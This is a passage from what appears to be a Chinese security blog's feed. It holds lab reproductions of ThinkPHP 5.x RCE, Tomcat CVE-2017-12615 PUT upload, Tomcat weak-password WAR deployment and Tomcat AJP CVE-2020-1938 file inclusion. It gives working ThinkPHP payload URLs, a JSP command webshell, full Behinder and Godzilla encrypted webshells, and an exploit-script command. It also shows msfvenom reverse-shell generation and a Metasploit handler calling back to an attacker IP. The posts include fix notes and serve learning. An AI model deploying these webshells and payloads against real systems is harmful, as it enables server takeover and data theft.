<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>




<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub thinkphp 5-rce</p>
<p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
<p>直接使用5.0.x的poc触发漏洞</p>
<p><img src="https://i.loli.net/2021/10/25/ELWkrRx1dB5QzA2.png" alt=" "></p>
<p>默认情况下没有开启强路由，而是默认开启路由兼容模式</p>
<p>由于没有开启强路由说明可以使用路由兼容模式的<code>s参数</code>，而对控制器名进行严格检测说明可能可以调用任意的控制器，所以得出思路就是利用<code>http://ip/?s=模块/控制器/方法</code>来测试</p>
<p>构造<code>?s=index/think\config/get&amp;name=database.username</code></p>
<p>获取配置信息</p>
<p><img src="https://i.loli.net/2021/10/25/ciuAZ9WULFPfroN.png" alt="image-20211025170829378"></p>
<p>其中5.1.x的一部分poc并不能利用，原因是一些payload在Windows的主机上是不可利用的，踩坑记录详见第一篇文章的总结</p>
<blockquote>
<p>由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类</p>
</blockquote>
<p>所以可以使用兼容多平台的payload，贴上师傅总结的payload</p>
<p>5.1是下面这些：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Loader </span><br><span class="line">Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561</span><br><span class="line">think\Error </span><br><span class="line">think\Container</span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Facade</span><br><span class="line">think\facade\Env</span><br><span class="line">env</span><br><span class="line">think\Db</span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File</span><br><span class="line">think\facade\Route</span><br><span class="line">route</span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule</span><br><span class="line">think\route\RuleGroup</span><br><span class="line">think\route\Domain</span><br><span class="line">think\route\RuleItem</span><br><span class="line">think\route\RuleName</span><br><span class="line">think\route\Dispatch</span><br><span class="line">think\route\dispatch\Url</span><br><span class="line">think\route\dispatch\Module</span><br><span class="line">think\Middleware</span><br><span class="line">think\Cookie</span><br><span class="line">think\View</span><br><span class="line">think\view\driver\Think</span><br><span class="line">think\Template</span><br><span class="line">think\template\driver\File</span><br><span class="line">think\Session</span><br><span class="line">think\Debug</span><br><span class="line">think\Cache</span><br><span class="line">think\cache\Driver</span><br><span class="line">think\cache\driver\File</span><br></pre></td></tr></table></figure>
<p>5.0 的有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Config</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Request</span><br><span class="line">think\Hook</span><br><span class="line">think\Env</span><br><span class="line">think\Lang</span><br><span class="line">think\Log</span><br><span class="line">think\Loader</span><br></pre></td></tr></table></figure>
<p>两个版本公有的是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route </span><br><span class="line">think\Loader </span><br><span class="line">think\Error </span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>升级框架版本，新版本中修复了控制器的调用</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
<p><a href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
]]></content>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat rce cve-2017-12615</title>
    <url>/2021/07/24/tomcat-rce-cve-2017-12615/</url>
    <content><![CDATA[<p>vulhub来复现一下Tomcat CVE-2017-12615</p>
<h2 id="tomcat-RCE-CVE-2017-12615"><a href="#tomcat-RCE-CVE-2017-12615" class="headerlink" title="tomcat RCE CVE-2017-12615"></a>tomcat RCE CVE-2017-12615</h2><p>搭建环境</p>
<blockquote>
<p> 进入目录</p>
<p> docker-compose build</p>
<p> docker-compose up -d</p>
</blockquote>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>存在该漏洞的Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT请求方法，攻击者可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行</p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Tomcat 7.0.0 - 7.0.79</p>
<p>Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞利用的条件有两个，一个是Tomcat要运行在Windows上，二是要启用PUT请求方法</p>
<blockquote>
<p>要是自己搭环境来复现的话，只需在conf/web.xml中添加，而使用vulhub进行复现，不需要手动修改配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当<code>resdonly</code>的值为true时，是不开启PUT的方法的，当它为false时，则是开启PUT方法。</p>
</blockquote>
<p>开启了PUT方法，但并不意味着可以任意上传文件，区别spservlet与defaultservlet的不同</p>
<blockquote>
<ul>
<li>org.apache.jasper.servlet.JspServlet：默认处理jsp，jspx文件请求，不存在PUT上传逻辑，无法处理PUT请求</li>
<li>org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除jsp，jspx之外的文件），存在PUT上传处理逻辑，可以处理PUT请求</li>
</ul>
</blockquote>
<p>所以当无法直接PUT一个jsp或jspx的文件到服务器，但是当利用Windows特性（xxx.jsp**%20<strong>，xxx.jsp</strong>::$DATA**）put文件时，Tomcat并不认为其是jsp文件，由defaultservlet进行处理，从而成功创建jsp文件</p>
<p>而当上传xxx.jsp**/<strong>（后缀以</strong>/**结束）同样会成功创建jsp文件，并且这种方式将漏洞利用扩展到了linux平台和Tomcat5.x~9.x的所有版本</p>
<blockquote>
<p>这就解释了复现环境中的Tomcat版本为8.x并且搭建在linux上同样可以复现</p>
</blockquote>
<h3 id="抓包写入文件"><a href="#抓包写入文件" class="headerlink" title="抓包写入文件"></a>抓包写入文件</h3><p>写入1.jsp文件，jsp一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;111&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;          </span><br><span class="line">        byte[] b &#x3D; new byte[1024];          </span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);          </span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));          </span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>linux下可以使用**/**来绕过限制，而Windows下使用%20或::$DATA绕过</p>
<p><img src="https://i.loli.net/2021/09/07/o3yKYpcXeQaS9Cr.png" alt="image-20210907123842701"></p>
<p>直接访问1.jsp文件，同时get传递get和cmd参数，构造<code>xxx/1.jsp?&amp;pwd=111&amp;cmd=whoami</code></p>
<p><img src="https://i.loli.net/2021/09/07/zwOAR6i7WZM3bXq.png" alt="image-20210907124235162"></p>
<p><img src="https://i.loli.net/2021/09/07/TkczeLGR8J1Cvbt.png" alt="image-20210907144320156"></p>
<p>而想要通过流量加密的shell管理工具冰蝎或哥斯拉进行连接需要使用其特定的shell</p>
<blockquote>
<p>冰蝎的shell是在其目录下server文件夹中</p>
<p>哥斯拉需要在管理中生成特定的shell</p>
</blockquote>
<h4 id="冰蝎特定shell"><a href="#冰蝎特定shell" class="headerlink" title="冰蝎特定shell"></a>冰蝎特定shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;</span><br><span class="line">session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/07/qutFSPW3R8pHgbA.png" alt="image-20210907162840535"></p>
<h4 id="哥斯拉特定shell"><a href="#哥斯拉特定shell" class="headerlink" title="哥斯拉特定shell"></a>哥斯拉特定shell</h4><p><img src="https://i.loli.net/2021/09/07/cpDVnYTdbF3PIsk.png" alt="image-20210907162941805"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/09/07/FOD3u1rowWZe4sh.png" alt="image-20210907163221547"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xiaoqiyue/p/9954493.html">漏洞复现——tomcat远程代码执行漏洞</a></p>
<p><a href="https://www.freebuf.com/vuls/247338.html">CVE-2017-12615 Tomcat远程代码执行漏洞复现</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e">Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass</a></p>
]]></content>
      <categories>
        <category>Tomcat rce</category>
      </categories>
      <tags>
        <tag>tomcat rce</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat8 弱口令</title>
    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>


<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
<p>docker搭建环境</p>
<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
<p>找到上传点</p>
<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
<blockquote>
<p>111.jsp</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
<p>上传111.war，连接</p>
<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat-ajp文件包含漏洞</title>
    <url>/2021/09/08/tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B9%BD%E7%81%B5%E7%8C%AB%EF%BC%89/</url>
    <content><![CDATA[<h2 id="tomcat-ajp文件包含漏洞-CVE-2020-1938"><a href="#tomcat-ajp文件包含漏洞-CVE-2020-1938" class="headerlink" title="tomcat-ajp文件包含漏洞 CVE-2020-1938"></a>tomcat-ajp文件包含漏洞 CVE-2020-1938</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Tomcat默认开启的<strong>AJP服务（8009端口）</strong>存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件，可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件</p>
<p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip</p>
<blockquote>
<p>Connector（连接器）组件是Tomcat最核心的两个组件之一，主要的职责就是负责接收客户端连接和客户端请求的处理加工。每个Connector都将指定一个端口进行监听；将Tomcat比作一个城堡，那么Connector就是城门</p>
</blockquote>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>docker搭建环境</p>
<p><img src="https://i.loli.net/2021/09/08/eOrgYBERwTCxaZD.png" alt="image-20210908194431450"></p>
<p>Tomcat版本 9.0.30</p>
<p>nmap探测8009端口</p>
<p><img src="https://i.loli.net/2021/09/08/iR3w7vzjZ1nr5V4.png" alt="image-20210908200305668"></p>
<p>8009端口开放，ajp协议开启</p>
<p>利用exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -f WEB.INF&#x2F;web.xml ip -p 8009</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/09/6UhZ9sgE3cCrDmn.png" alt="image-20210909165013668"></p>
<p>成功读取到webapps中<code>ROOT/WEB-INF</code>目录下下web.xml文件</p>
<h3 id="跨目录读取"><a href="#跨目录读取" class="headerlink" title="跨目录读取"></a>跨目录读取</h3><p>脚本默认读取ROOT目录下文件，通过修改可以读取webapps中其他目录中的文件</p>
<blockquote>
<p>但是不能跨目录读取文件，如/etc/passwd，只能读取<code>/usr/local/tomcat/webapps</code>目录下文件</p>
</blockquote>
<p><img src="https://i.loli.net/2021/09/09/uZEp41BSrIU8dox.png" alt="image-20210909162940330"></p>
<p>而要读取其他目录下文件，仅需修改exp，在<code>/asdf</code>前添加文件目录xxx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_,data &#x3D; t.perform_request(&#39;&#x2F;xxx&#x2F;asdf&#39;,attributes&#x3D;[</span><br></pre></td></tr></table></figure>
<p>查看docs目录下的BUILDING.txt文件</p>
<p><img src="https://i.loli.net/2021/09/09/27z9dT6AachuW3o.png" alt="image-20210909164327328"></p>
<p>使用脚本读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -f BUILDING.txt ip -p 8009</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/09/09/YEk2Rc4SI1lofB7.png" alt="image-20210909164814281"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>msfvenom生成payload，其中ip为攻击者ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep java #搜索javapayload</span><br><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;ip LPORT&#x3D;4444 &gt; shell.txt #生成shell.txt payload </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/09/YR98LtODqsjr2oW.png" alt="image-20210909190452428"></p>
<p>存在上传点的话，找到上传点，将payload上传，修改脚本，在<code>/asdf</code>后加上<code>.jsp</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_,data &#x3D; t.perform_request(&#39;&#x2F;asdf.jsp&#39;,attributes&#x3D;[</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的环境没有上传点，为了演示直接在docker容器中创建shell.txt文件</p>
</blockquote>
<p><img src="https://i.loli.net/2021/09/09/RTzspX6nh4qetHN.png" alt="image-20210909202035638"></p>
<p>msfconsole监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 攻击者ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>运行脚本</p>
<p><img src="https://i.loli.net/2021/09/09/cxOe9dfYk7CPjiy.png" alt="image-20210909201924800"></p>
<p><img src="https://i.loli.net/2021/09/09/ShHijTBCbEW73Yg.jpg" alt="img"></p>
<p>附exp</p>
<p><a href="https://github.com/hypn0s/AJPy">https://github.com/hypn0s/AJPy</a></p>
<p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol>
<li>临时禁用ajp协议端口，修改或注释conf/server.xml文件中的</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot;redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>升级到安全版本</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/A66666/p/048ac3f5170d724b03f62531da252a20.html">CVE-2020-1938复现</a></p>
<p><a href="http://hackdig.com/09/hack-130739.htm">文件包含漏洞之——tomcat CVE-2020-1938漏洞复现(getshell)</a></p>
<p><a href="https://www.cnblogs.com/dogecheng/p/12604489.html">CVE-2020-1938 Apache Tomcat AJP文件包含漏洞</a></p>
<p><a href="https://www.cnblogs.com/lcxblogs/p/14024827.html">msfvenom简介</a></p>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础学习</title>
    <url>/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="web基础之信息收集"><a href="#web基础之信息收集" class="headerlink" title="web基础之信息收集"></a>web基础之信息收集</h1><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>whois查询和备案信息</p>
<p>可能获取到的信息有：注册人、注册商、邮件、dns解析服务器、注册人电话、地址位置等等</p>
<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>对该目标进行全方位、不同业务的认识</p>
<p>了解其运行框架</p>
<h3 id="真实ip、旁段、C段"><a href="#真实ip、旁段、C段" class="headerlink" title="真实ip、旁段、C段"></a>真实ip、旁段、C段</h3><p>端口信息：开放的端口和服务漏洞</p>
<p>历史的解析域名和域名的历史解析ip</p>
<h3 id="敏感信息、目录和文件"><a href="#敏感信息、目录和文件" class="headerlink" title="敏感信息、目录和文件"></a>敏感信息、目录和文件</h3><p>可能存在敏感信息泄露，获取到登陆点、后台、物理路径、waf信息、个人信息等等</p>
<h3 id="社工信息"><a href="#社工信息" class="headerlink" title="社工信息"></a>社工信息</h3><p>查看注册的网站 reg007</p>
